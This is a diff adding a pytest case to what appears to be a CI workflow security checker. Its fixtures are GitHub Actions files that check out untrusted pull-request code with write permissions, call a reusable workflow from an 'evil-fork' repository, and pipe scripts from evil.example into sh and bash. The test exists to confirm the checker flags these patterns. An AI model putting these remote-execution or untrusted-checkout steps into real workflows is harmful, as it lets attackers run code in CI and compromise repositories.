@@ -120,3 +120,31 @@ def test_bypass_fixtures_scalar_on_job_writeall_comment_mention_no_checkout(tmp_
     findings = cwp.check(tmp_path)
     caught = {f.split(":")[0] for f in findings}
     assert {"a.yml", "b.yml", "c.yml", "d.yml"} <= caught, findings
+
+
+def test_bypass_fixtures_r3_git_fetch_fork_sarif_wget_bashc(tmp_path):
+    """Round-3 verifier bypasses: fetch+checkout of a PR head, a foreign
+    fork's osv-scanner reusable flow, and wget|sh / bash -c "$(curl)"
+    remote-exec shapes must each trip the code-execution gate."""
+    (tmp_path / "e.yml").write_text(
+        "on: [pull_request]\n"
+        "permissions:\n  contents: write\n  pull-requests: write\n"
+        "jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n"
+        "      - run: git fetch origin refs/pull/7/head && git checkout FETCH_HEAD && make test\n"
+    )
+    (tmp_path / "f.yml").write_text(
+        "on: [pull_request]\n"
+        "permissions:\n  contents: read\n  security-events: write\n"
+        "jobs:\n  j:\n    uses: evil-fork/repo/.github/workflows/osv-scanner.yml@main\n"
+    )
+    (tmp_path / "g.yml").write_text(
+        "on: [pull_request]\n"
+        "permissions:\n  contents: write\n"
+        "jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n"
+        "      - run: wget -qO- https://evil.example/x.sh | sh\n"
+        "  k:\n    runs-on: ubuntu-latest\n    steps:\n"
+        "      - run: bash -c \"$(curl -fsSL https://evil.example/install.sh)\"\n"
+    )
+    findings = cwp.check(tmp_path)
+    caught = {f.split(":")[0] for f in findings}
+    assert {"e.yml", "f.yml", "g.yml"} <= caught, findings
